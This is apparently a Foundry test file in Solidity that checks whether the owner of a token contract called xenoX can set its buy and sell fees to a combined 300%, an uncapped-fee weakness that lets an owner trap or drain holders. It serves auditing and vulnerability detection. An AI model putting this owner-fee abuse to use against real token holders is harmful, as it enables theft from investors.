// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/xenoX.sol";

contract MockRouter {
    address public factory;
    address public WETH;
}

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(0x123);
    }
}

contract XenoXFeeTest is Test {
    xenoX token;
    address owner = address(1);
    address constant HARDCODED_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Deploy mock dependencies
        MockFactory mockFactory = new MockFactory();
        MockWETH mockWETH = new MockWETH();
        
        // Setup mock router at hardcoded address
        vm.etch(HARDCODED_ROUTER, type(MockRouter).runtimeCode);
        bytes32 factorySlot = bytes32(uint256(0));
        bytes32 wethSlot = bytes32(uint256(1));
        vm.store(HARDCODED_ROUTER, factorySlot, bytes32(uint256(uint160(address(mockFactory)))));
        vm.store(HARDCODED_ROUTER, wethSlot, bytes32(uint256(uint160(address(mockWETH)))));

        // Deploy actual token contract
        vm.startPrank(owner);
        token = new xenoX();
        vm.stopPrank();
    }

    function test_excessive_fee_settings() public {
        console.log("--- BEFORE-Trigger Fee Queries ---");
        uint buyFeeBefore = token.getBuyFee();
        uint sellFeeBefore = token.getSellFee();
        console.log("[PRE-DATA] Buy fee: %s%% | Sell fee: %s%%", buyFeeBefore, sellFeeBefore);

        console.log("--- Trigger SET-100%-Fee Attack ---");
        vm.startPrank(owner);
        token.setBuyTaxFeePercent(100);
        token.setBuyLiquidityFeePercent(100);
        token.setBuydevFeePercent(100);
        
        token.setSellTaxFeePercent(100);
        token.setSellLiquidityFeePercent(100);
        token.setSelldevFeePercent(100);
        vm.stopPrank();

        console.log("--- AFTER-Trigger Fee Queries ---");
        uint buyFeeAfter = token.getBuyFee();
        uint sellFeeAfter = token.getSellFee();
        console.log("[POST-DATA] Buy fee: %s%% | Sell fee: %s%%", buyFeeAfter, sellFeeAfter);

        // Vulnerability verification
        bool buyFeeExploited = (buyFeeAfter == 300); // 100+100+100=300%
        bool sellFeeExploited = (sellFeeAfter == 300); // 100+100+100=300%
        
        if (buyFeeExploited && sellFeeExploited) {
            console.log("Vulnerability Exists: Fees successfully set to 300%%");
        } else {
            console.log("Vulnerability not Exist: Failed to set 300%% fees (Buy: %s%%, Sell: %s%%)", 
                buyFeeAfter, sellFeeAfter);
        }
    }
}

contract MockWETH {}